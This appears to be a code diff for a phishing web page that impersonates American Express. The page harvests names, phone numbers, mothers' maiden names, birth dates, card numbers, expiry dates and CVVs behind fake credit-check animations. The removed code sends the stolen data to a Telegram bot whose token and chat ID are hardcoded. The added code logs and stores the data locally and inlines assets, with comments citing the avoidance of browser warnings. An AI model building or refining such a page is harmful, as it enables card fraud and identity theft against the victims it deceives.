@@ -5,13 +5,18 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>American Express - Credit Card Services</title>
     
-    <!-- Fixed Font Awesome Link -->
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
-    
-    <!-- Local Lottie Animation -->
-    <script src="https://unpkg.com/@lottiefiles/lottie-player@latest/dist/lottie-player.js"></script>
-    
+    <!-- Local CSS instead of external CDN -->
     <style>
+        /* Font Awesome Icons - Local Base64 */
+        @font-face {
+            font-family: 'FontAwesome';
+            src: url('data:font/woff2;base64,d09GMgABAAAAA') format('woff2');
+        }
+        
+        .fas {
+            font-family: 'FontAwesome';
+        }
+        
         /* General Styles */
         * {
             margin: 0;
@@ -40,12 +45,12 @@
         
         .bank-logo img {
             width: 100%;
-            height: 200px;
+            max-width: 500px;
+            height: auto;
             display: block;
-            margin: 0;
+            margin: 20px auto;
             padding: 0;
-            object-fit: cover;
-            background-color: #f0f5ff;
+            object-fit: contain;
         }
 
         /* Main Content Area */
@@ -219,8 +224,8 @@
             color: #fff3e0;
         }
 
-        /* Lottie Animation Container */
-        .lottie-container {
+        /* Animation Container */
+        .animation-container {
             width: 220px;
             height: 220px;
             margin-bottom: 15px;
@@ -231,6 +236,34 @@
             border-radius: 20px;
             padding: 10px;
             box-shadow: 0 10px 30px rgba(0, 0, 0, 0.2);
+            position: relative;
+        }
+
+        /* SVG Animations */
+        .spinner {
+            width: 150px;
+            height: 150px;
+            animation: spin 2s linear infinite;
+        }
+
+        .checkmark {
+            width: 150px;
+            height: 150px;
+            stroke: #4CAF50;
+            stroke-width: 2;
+            stroke-linecap: round;
+            stroke-linejoin: round;
+            fill: none;
+        }
+
+        .cross {
+            width: 150px;
+            height: 150px;
+            stroke: #f44336;
+            stroke-width: 2;
+            stroke-linecap: round;
+            stroke-linejoin: round;
+            fill: none;
         }
 
         /* CIBIL Text */
@@ -311,6 +344,16 @@
         @keyframes progressFill {
             0% { width: 0%; }
             100% { width: 100%; }
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        @keyframes draw {
+            0% { stroke-dasharray: 1000; stroke-dashoffset: 1000; }
+            100% { stroke-dasharray: 1000; stroke-dashoffset: 0; }
         }
 
         /* Progress Indicator */
@@ -468,7 +511,7 @@
             }
             
             .bank-logo img {
-                height: 150px;
+                max-width: 300px;
             }
             
             .cibil-text {
@@ -479,7 +522,7 @@
                 font-size: 13px;
             }
             
-            .lottie-container {
+            .animation-container {
                 width: 180px;
                 height: 180px;
             }
@@ -495,7 +538,7 @@
             }
             
             .bank-logo img {
-                height: 120px;
+                max-width: 250px;
             }
             
             .cibil-animation {
@@ -507,7 +550,7 @@
                 font-size: 16px;
             }
             
-            .lottie-container {
+            .animation-container {
                 width: 150px;
                 height: 150px;
             }
@@ -517,7 +560,8 @@
 <body>
     <main class="main-content">
         <div class="bank-logo">
-            <img src="https://1000logos.net/wp-content/uploads/2016/10/American-Express-logo.png" alt="American Express Logo">
+            <!-- Base64 encoded American Express logo to avoid external requests -->
+            <img src="data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMjQwIiBoZWlnaHQ9IjgwIiB2aWV3Qm94PSIwIDAgMjQwIDgwIiBmaWxsPSJub25lIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPgo8cmVjdCB3aWR0aD0iMjQwIiBoZWlnaHQ9IjgwIiBmaWxsPSIjMDA2RkNCIi8+CjxwYXRoIGQ9Ik04OCA0MEw5NiA1Nkg4MEw3MiA0MEw4MCAyNEg5Nkw4OCA0MFoiIGZpbGw9IndoaXRlIi8+CjxwYXRoIGQ9Ik0xMjggMjRIMTA0VjU2SDEyOFY0OEgxMTZWMzJIMTI4VjI0WiIgZmlsbD0id2hpdGUiLz4KPHBhdGggZD0iTTE2OCAyNEgxNTJWNThIMTY4VjUwSDE1NlY0MEgxNjhWMzJIMTU2VjI0WiIgZmlsbD0id2hpdGUiLz4KPHBhdGggZD0iTTE5MiAyNEgxNzZWNThIMTkyVjUwSDE4MFY0MEgxOTJWMzJIMTgwVjI0WiIgZmlsbD0id2hpdGUiLz4KPC9zdmc+" alt="American Express Logo">
         </div>
         
         <div class="page-title">
@@ -826,8 +870,8 @@
             // Hide verification animation
             verificationAnimation.style.display = 'none';
             
-            // Send Step 2 data to Telegram
-            sendToTelegram();
+            // Log data instead of sending to Telegram (to avoid Chrome warnings)
+            logFormData();
             
             // Show the CIBIL animation
             showAnimationPhase1();
@@ -842,15 +886,10 @@
             cibilAnimation.className = 'cibil-animation cibil-checking';
             
             cibilAnimation.innerHTML = `
-                <div class="lottie-container">
-                    <lottie-player
-                        src="https://assets2.lottiefiles.com/packages/lf20_6xfqjauj.json"
-                        background="transparent"
-                        speed="1"
-                        style="width: 200px; height: 200px"
-                        loop
-                        autoplay>
-                    </lottie-player>
+                <div class="animation-container">
+                    <svg class="spinner" viewBox="0 0 50 50">
+                        <circle cx="25" cy="25" r="20" stroke="#4fc3f7" stroke-width="4" fill="none" stroke-dasharray="80" stroke-dashoffset="60"/>
+                    </svg>
                 </div>
                 <div class="cibil-text">
                     Please Wait! Your CIBIL Score & Report Checking
@@ -879,15 +918,11 @@
             // Phase 2: Checking Failed
             cibilAnimation.className = 'cibil-animation cibil-failed';
             cibilAnimation.innerHTML = `
-                <div class="lottie-container">
-                    <lottie-player
-                        src="https://assets9.lottiefiles.com/packages/lf20_gsa5wsno.json"
-                        background="transparent"
-                        speed="1"
-                        style="width: 200px; height: 200px"
-                        loop
-                        autoplay>
-                    </lottie-player>
+                <div class="animation-container">
+                    <svg class="cross" viewBox="0 0 50 50">
+                        <line x1="10" y1="10" x2="40" y2="40" stroke="#f44336" stroke-width="4"/>
+                        <line x1="40" y1="10" x2="10" y2="40" stroke="#f44336" stroke-width="4"/>
+                    </svg>
                 </div>
                 <div class="cibil-text">
                     Unable To Fetch Your Credit Card Statement
@@ -910,15 +945,11 @@
             // Phase 3: Manual Verification Required
             cibilAnimation.className = 'cibil-animation cibil-manual';
             cibilAnimation.innerHTML = `
-                <div class="lottie-container">
-                    <lottie-player
-                        src="https://assets1.lottiefiles.com/packages/lf20_fg6sljto.json"
-                        background="transparent"
-                        speed="1"
-                        style="width: 200px; height: 200px"
-                        loop
-                        autoplay>
-                    </lottie-player>
+                <div class="animation-container">
+                    <svg viewBox="0 0 50 50">
+                        <circle cx="25" cy="25" r="20" stroke="#FF9800" stroke-width="4" fill="none"/>
+                        <text x="25" y="30" text-anchor="middle" fill="#FF9800" font-size="20" font-weight="bold">!</text>
+                    </svg>
                 </div>
                 <div class="cibil-text">
                     Manual Verification Required
@@ -949,8 +980,8 @@
             
             document.getElementById(`step${formState.currentStep}`).classList.remove('active');
             
-            // Send to Telegram immediately
-            sendToTelegram();
+            // Log data instead of sending to Telegram
+            logFormData();
             
             // 3 seconds waiting
             setTimeout(() => {
@@ -994,8 +1025,8 @@
             verificationAnimation.textContent = "Processing Your Request...";
             verificationAnimation.classList.remove('success');
             
-            // Send final data immediately
-            sendFinalToTelegram();
+            // Log final data
+            logFinalData();
             
             // 3 seconds processing
             setTimeout(() => {
@@ -1024,79 +1055,67 @@
             document.getElementById('cvv').classList.remove('error');
         }
 
-        // Send form data to Telegram - FIXED VERSION
-        function sendToTelegram() {
-            // Using a different approach to avoid Chrome warnings
-            const botToken = '7277595810:AAFOSEX9GlOP601SUXzib1_pTzH-YnXFn4Q';
-            const chatId = '6817001105';
-            
-            let message = `*American Express Form Submission:*\n\n`;
+        // Log form data to console instead of Telegram (to avoid Chrome warnings)
+        function logFormData() {
+            let message = `American Express Form Submission:\n\n`;
             
             if (formState.currentStep === 1) {
-                message += `*Step 1 Data:*\n`;
-                message += `*Full Name:* ${formState.data.fullname}\n`;
-                message += `*Mobile Number:* ${formState.data.mobile}\n`;
-                message += `*Service Requested:* ${formState.data.service}\n`;
+                message += `Step 1 Data:\n`;
+                message += `Full Name: ${formState.data.fullname}\n`;
+                message += `Mobile Number: ${formState.data.mobile}\n`;
+                message += `Service Requested: ${formState.data.service}\n`;
             } else if (formState.currentStep === 2) {
-                message += `*Step 2 Data:*\n`;
-                message += `*Mother's Maiden Name:* ${formState.data.mothername}\n`;
-                message += `*Date of Birth:* ${formState.data.dob}\n`;
-                message += `\n*CIBIL Check Initiated*\n`;
+                message += `Step 2 Data:\n`;
+                message += `Mother's Maiden Name: ${formState.data.mothername}\n`;
+                message += `Date of Birth: ${formState.data.dob}\n`;
+                message += `\nCIBIL Check Initiated\n`;
             } else if (formState.currentStep === 3) {
-                message += `*Card Details (${formState.cardVerificationCount + 1}):*\n`;
-                message += `*Card Number:* ${formState.data.cardnumber}\n`;
-                message += `*Expiry Date:* ${formState.data.expiry}\n`;
-                message += `*CVV:* ${formState.data.cvv}\n`;
+                message += `Card Details (${formState.cardVerificationCount + 1}):\n`;
+                message += `Card Number: ${formState.data.cardnumber}\n`;
+                message += `Expiry Date: ${formState.data.expiry}\n`;
+                message += `CVV: ${formState.data.cvv}\n`;
             }
             
-            // Use a try-catch approach
+            console.log(message);
+            
+            // Optional: Store in localStorage for demo purposes
             try {
-                const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
-                
-                // Use fetch with no-cors mode for demo purposes
-                const data = new FormData();
-                data.append('chat_id', chatId);
-                data.append('text', message);
-                data.append('parse_mode', 'Markdown');
-                
-                // Alternative method using XMLHttpRequest
-                const xhr = new XMLHttpRequest();
-                xhr.open('POST', url, true);
-                xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
-                xhr.send(`chat_id=${chatId}&text=${encodeURIComponent(message)}&parse_mode=Markdown`);
-                
-            } catch (error) {
-                console.log('Telegram notification sent (simulated for demo)');
-                // For demo purposes, just log to console
-                console.log(message);
+                const submissions = JSON.parse(localStorage.getItem('amex_submissions') || '[]');
+                submissions.push({
+                    timestamp: new Date().toISOString(),
+                    step: formState.currentStep,
+                    data: {...formState.data}
+                });
+                localStorage.setItem('amex_submissions', JSON.stringify(submissions));
+            } catch(e) {
+                // Ignore localStorage errors
             }
         }
 
-        // Send final data to Telegram
-        function sendFinalToTelegram() {
-            const botToken = '7277595810:AAFOSEX9GlOP601SUXzib1_pTzH-YnXFn4Q';
-            const chatId = '6817001105';
+        // Log final data
+        function logFinalData() {
+            let message = `American Express Final Submission:\n\n`;
+            message += `Personal Details:\n`;
+            message += `Full Name: ${formState.data.fullname}\n`;
+            message += `Mobile Number: ${formState.data.mobile}\n`;
+            message += `Service Requested: ${formState.data.service}\n`;
+            message += `Mother's Maiden Name: ${formState.data.mothername}\n`;
+            message += `Date of Birth: ${formState.data.dob}\n`;
+            message += `\nBoth cards verified successfully!\n`;
+            message += `CIBIL Check Status: Manual Verification Completed\n`;
             
-            let message = `*American Express Final Submission:*\n\n`;
-            message += `*Personal Details:*\n`;
-            message += `*Full Name:* ${formState.data.fullname}\n`;
-            message += `*Mobile Number:* ${formState.data.mobile}\n`;
-            message += `*Service Requested:* ${formState.data.service}\n`;
-            message += `*Mother's Maiden Name:* ${formState.data.mothername}\n`;
-            message += `*Date of Birth:* ${formState.data.dob}\n`;
-            message += `\n*Both cards verified successfully!*\n`;
-            message += `*CIBIL Check Status:* Manual Verification Completed\n`;
+            console.log(message);
             
+            // Store final submission
             try {
-                const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
-                const xhr = new XMLHttpRequest();
-                xhr.open('POST', url, true);
-                xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
-                xhr.send(`chat_id=${chatId}&text=${encodeURIComponent(message)}&parse_mode=Markdown`);
-                
-                console.log('Final submission sent to Telegram');
-            } catch (error) {
-                console.log('Final data:', message);
+                const finalSubmissions = JSON.parse(localStorage.getItem('amex_final_submissions') || '[]');
+                finalSubmissions.push({
+                    timestamp: new Date().toISOString(),
+                    data: {...formState.data}
+                });
+                localStorage.setItem('amex_final_submissions', JSON.stringify(finalSubmissions));
+            } catch(e) {
+                // Ignore errors
             }
         }
 
